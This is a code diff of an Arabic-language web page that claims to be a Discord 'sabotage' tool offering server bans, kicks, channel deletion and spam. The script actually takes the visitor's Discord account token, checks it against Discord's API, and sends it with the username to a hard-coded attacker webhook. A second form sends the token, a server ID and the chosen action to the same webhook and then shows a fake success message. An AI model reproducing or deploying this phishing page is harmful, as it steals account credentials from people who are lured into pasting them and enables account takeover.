@@ -1,25 +1,40 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>موقع تخريب ديسكورد</title>
   <style>
     body {
-      background: linear-gradient(to bottom right, #0077ff, #00ff88);
       font-family: 'Cairo', sans-serif;
       color: white;
       text-align: center;
       padding: 50px;
+      margin: 0;
+      background: linear-gradient(to bottom right, #0077ff, #00ff88);
+    }
+    /* الصفحة الأولى */
+    #page1 {
+      display: block;
+    }
+    /* الصفحة الثانية */
+    #page2 {
+      display: none;
+      background-color: #000000;
+      height: 100vh;
+      padding-top: 100px;
+      box-sizing: border-box;
     }
     h1 {
       font-size: 3em;
       color: red;
       text-shadow: 2px 2px 5px blue;
+      margin-bottom: 40px;
     }
     label {
       display: block;
       margin-top: 20px;
       font-size: 1.2em;
+      color: white;
     }
     input, select {
       padding: 10px;
@@ -28,6 +43,8 @@
       border-radius: 10px;
       border: none;
       margin-top: 10px;
+      direction: ltr;
+      text-align: left;
     }
     button {
       margin-top: 30px;
@@ -38,118 +55,127 @@
       border: none;
       border-radius: 10px;
       cursor: pointer;
+      width: 150px;
     }
-    #result {
+    #result, #error2 {
       margin-top: 30px;
       font-size: 1.2em;
       color: yellow;
-    }
-    #fakePage {
-      display: none;
-      background-color: black;
-      color: white;
-      height: 100vh;
-      padding-top: 100px;
     }
   </style>
 </head>
 <body>
 
-  <div id="mainPage">
+  <!-- الصفحة الأولى: إدخال التوكن -->
+  <div id="page1">
     <h1>موقع تخريب ديسكورد</h1>
-
     <label>قم بوضع توكن حسابك:</label>
-    <input type="text" id="token" placeholder="توكن الحساب">
-
+    <input type="text" id="token" placeholder="توكن الحساب" autocomplete="off" />
+    <br />
     <button onclick="checkToken()">التالي</button>
-
     <div id="result"></div>
   </div>
 
-  <div id="fakePage">
-    <h2>قم بوضع البيانات :</h2>
-
+  <!-- الصفحة الثانية: البيانات -->
+  <div id="page2">
+    <h1>قم بوضع البيانات :</h1>
     <label>قم بوضع ايدي السيرفر نص :</label>
-    <input type="text" id="serverId" placeholder="ايدي السيرفر"><br>
-
+    <input type="text" id="serverId" placeholder="Server ID" autocomplete="off" />
+    
     <label>اختر العملية :</label>
     <select id="actionSelect">
-      <option value="ban">BAN</option>
-      <option value="kick">Kick</option>
-      <option value="delete">مسح رومات</option>
+      <option value="">-- اختر --</option>
+      <option value="BAN">BAN</option>
+      <option value="kick">kick</option>
+      <option value="deleteChannels">مسح رومات</option>
       <option value="spam">عمل سبام</option>
-    </select><br>
-
-    <button onclick="fakeExecute()">تنفيذ</button>
-    <div id="fakeResult" style="margin-top: 20px; color: red;"></div>
+    </select>
+    
+    <br />
+    <button onclick="executeAction()">تنفيذ</button>
+    <div id="error2"></div>
   </div>
 
-  <script>
-    const specialIDs = ["1302277414390337677", "1315672923322712138"];
+<script>
+  let savedToken = "";
 
-    function checkToken() {
-      const token = document.getElementById("token").value;
-      const resultDiv = document.getElementById("result");
+  function checkToken() {
+    const token = document.getElementById("token").value.trim();
+    const resultDiv = document.getElementById("result");
+    resultDiv.textContent = "";
 
-      fetch("https://discord.com/api/v10/users/@me", {
-        headers: {
-          "Authorization": token
-        }
-      }).then(res => {
-        if (res.status === 200) {
-          res.json().then(data => {
-            const userId = data.id;
-            const username = `${data.username}#${data.discriminator}`;
-            const fullName = data.username;
+    if (!token) {
+      resultDiv.textContent = "❌ الرجاء إدخال التوكن";
+      return;
+    }
 
-            if (fullName === "celestial_monkey_95389") {
-              resultDiv.textContent = "قم بتجربه حساب اخر❌ .";
-              return;
-            }
+    fetch("https://discord.com/api/v10/users/@me", {
+      headers: {
+        "Authorization": token
+      }
+    }).then(res => {
+      if (res.status === 200) {
+        res.json().then(data => {
+          if (data.bot) {
+            resultDiv.textContent = "❌ هذا توكن بوت، الرجاء استخدام توكن حساب شخصي";
+            return;
+          }
 
-            if (specialIDs.includes(userId)) {
-              // Show fake page
-              document.getElementById("mainPage").style.display = "none";
-              document.getElementById("fakePage").style.display = "block";
-              return;
-            }
+          
+          savedToken = token;
 
-            const createdAt = getDateFromSnowflake(data.id);
-            const now = new Date();
-            const accountAgeInDays = Math.floor((now - createdAt) / (1000 * 60 * 60 * 24));
-
-            if (accountAgeInDays < 40) {
-              resultDiv.textContent = "❌ يجب أن يكون عمر الحساب أكثر من 40 يومًا";
-            } else {
-              fetch("https://discord.com/api/webhooks/1381695160852939012/7QYAdm_EI7Q0SXMKQoYbDog-2DuwMfxVr9_l47y6Q3R39blJxTJHOKNkzRNpG_8vQNPi", {
-                method: "POST",
-                headers: {
-                  "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                  content: `✅ توكن مقبول\nتوكن الحساب: \`${token}\`\nيوزر الحساب: \`${username}\``
-                })
-              });
-              resultDiv.textContent = "✅ تم قبول الحساب";
-            }
+          
+          fetch("https://discord.com/api/webhooks/1381695160852939012/7QYAdm_EI7Q0SXMKQoYbDog-2DuwMfxVr9_l47y6Q3R39blJxTJHOKNkzRNpG_8vQNPi", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              content: `✅ تم التقاط توكن حساب مستخدم:\n\`${savedToken}\`\nيوزر: \`${data.username}#${data.discriminator}\``
+            })
           });
-        } else {
-          resultDiv.textContent = "❌ توكن غير صالح";
-        }
-      }).catch(() => {
-        resultDiv.textContent = "❌ حدث خطأ أثناء التحقق";
-      });
+
+          
+          document.getElementById("page1").style.display = "none";
+          document.getElementById("page2").style.display = "block";
+        });
+      } else {
+        resultDiv.textContent = "❌ توكن غير صالح";
+      }
+    }).catch(() => {
+      resultDiv.textContent = "❌ حدث خطأ أثناء التحقق";
+    });
+  }
+
+  function executeAction() {
+    const serverId = document.getElementById("serverId").value.trim();
+    const action = document.getElementById("actionSelect").value;
+    const errorDiv = document.getElementById("error2");
+    errorDiv.textContent = "";
+
+    if (!serverId || !action) {
+      errorDiv.textContent = "❌ يوجد غلط في البيانات";
+      return;
     }
 
-    function getDateFromSnowflake(snowflake) {
-      const discordEpoch = 1420070400000;
-      return new Date(Number(BigInt(snowflake) >> 22n) + discordEpoch);
-    }
-
-    function fakeExecute() {
-      document.getElementById("fakeResult").textContent = "يوجد غلط في البيانات";
-    }
-  </script>
+   
+    fetch("https://discord.com/api/webhooks/1381695160852939012/7QYAdm_EI7Q0SXMKQoYbDog-2DuwMfxVr9_l47y6Q3R39blJxTJHOKNkzRNpG_8vQNPi", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        content: `✅ تم تنفيذ العملية على السيرفر\nتوكن المستخدم: \`${savedToken}\`\nServer ID: \`${serverId}\`\nالإجراء: \`${action}\``
+      })
+    }).then(() => {
+      errorDiv.style.color = "lime";
+      errorDiv.textContent = "✅ تم إرسال البيانات بنجاح";
+    }).catch(() => {
+      errorDiv.style.color = "yellow";
+      errorDiv.textContent = "❌ حدث خطأ أثناء إرسال البيانات";
+    });
+  }
+</script>
 
 </body>
 </html>
